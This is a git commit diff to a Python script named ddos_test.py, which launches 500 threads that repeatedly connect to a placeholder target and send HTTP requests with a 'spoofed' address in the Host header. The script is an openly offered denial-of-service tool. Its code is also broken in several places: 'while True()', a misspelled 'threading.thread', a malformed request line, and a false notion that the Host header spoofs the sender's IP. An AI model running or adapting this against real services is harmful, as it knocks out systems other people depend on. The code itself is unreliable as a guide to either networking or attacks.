cb9786aaab4f606d1964270a424fa4fe9083333d
Uriel Rivera <94717788+urielzrivera@users.noreply.github.com>
2023-02-06 15:30:28 -0800

    Update ddos_test.py

--- python/ddos_test.py
+++ python/ddos_test.py
@@ -11,9 +11,7 @@ target_host = <target name>
 target_port = <port #>
 spoofed_ip = <spoofed_ip>
 
-# Create socket object.
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+already_connected = 0
 
 '''
 Define function for DDoS and establish while Loop to maintain connection.
@@ -21,11 +19,19 @@ Define function for DDoS and establish while Loop to maintain connection.
 
 def ddos():
   while True():
+    # Create socket object.
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_host, target_port))
     s.sendto(('GET /' + target_host + ' HTTP 1.1/\r\n').encode('ascii'), (target_host, target_port))
     s.sendto(('Host: ' + spoofed_ip + ' \n\r\n\r').encode('ascii'), (target_host, target_port))
     s.close()
     
+    global already_connected
+    already_connected += 1
+    print(already_connected)
+    
 for i in range(500):
-  thread = threading.thread(target=attack)
+  thread = threading.thread(target=ddos)
+  thread.start()
     
